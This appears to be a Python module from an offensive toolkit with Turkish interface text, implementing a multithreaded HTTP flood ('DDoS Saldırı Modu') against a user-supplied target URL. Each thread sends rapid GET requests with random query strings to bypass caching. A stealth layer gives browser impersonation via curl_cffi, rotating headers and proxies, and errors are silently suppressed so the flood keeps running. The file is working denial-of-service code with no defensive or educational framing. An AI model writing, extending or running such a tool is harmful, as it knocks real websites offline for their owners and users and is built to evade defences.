import threading
import random
import time
import string
import sys

from core import clr
from core.stealth import StealthConfig, stealth_ayarla, STEALTH_FULL

def _random_query(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

class _FloodThread(threading.Thread):
    daemon = True

    def __init__(self, url: str, counter: dict, stop_event: threading.Event):
        super().__init__()
        self.url = url
        self.counter = counter
        self.stop_event = stop_event
        # Always use FULL stealth for DDOS
        self.stealth_config = StealthConfig.from_level(STEALTH_FULL)

    def run(self):
        # Obtain a persistent session with full impersonation for this thread
        headers, proxies, session, engine = stealth_ayarla(self.stealth_config)
        while not self.stop_event.is_set():
            try:
                # refresh headers every once in a while
                if random.random() < 0.1:
                    headers, proxies, session, engine = stealth_ayarla(self.stealth_config)
                    
                req_url = f"{self.url}?{_random_query(random.randint(3, 10))}"
                
                # We use the session directly (curl_cffi)
                if engine == "curl_cffi":
                    session.get(req_url, proxies=proxies, timeout=10)
                else: # fallback requests
                    session.get(req_url, headers=headers, proxies=proxies, timeout=10)
                
                self.counter["sent"] += 1
                print(f"  {clr.y}[✓]{clr.r} {self.counter['sent']} istek gönderildi")
            except Exception:
                # Silently catch errors during flood
                pass
            time.sleep(0.01)

def run_ddos():
    print(f"\n{clr.am1}╔═════════════════════════════════════╗")
    print(f"{clr.am1}║          DDoS Saldırı Modu          ║")
    print(f"{clr.am1}╚═════════════════════════════════════╝{clr.r}")
    
    target = input(f"{clr.am7}╠═══════ > Hedef URL: {clr.r}").strip()
    if not target:
        return

    thread_count = input(f"{clr.am7}╠═══════ > Thread Sayısı [50]: {clr.r}").strip()
    thread_count = int(thread_count) if thread_count.isdigit() else 50

    print(f"{clr.am6}║  Saldırı başlatılıyor... (Durdurmak için Ctrl+C){clr.r}")
    
    counter = {"sent": 0}
    stop_event = threading.Event()
    threads = []

    for _ in range(thread_count):
        t = _FloodThread(target, counter, stop_event)
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{clr.am5}║  Saldırı durduruluyor...{clr.r}")
        stop_event.set()
        for t in threads:
            t.join(timeout=1)
        print(f"{clr.am2}║  Saldırı sonlandırıldı.{clr.r}")
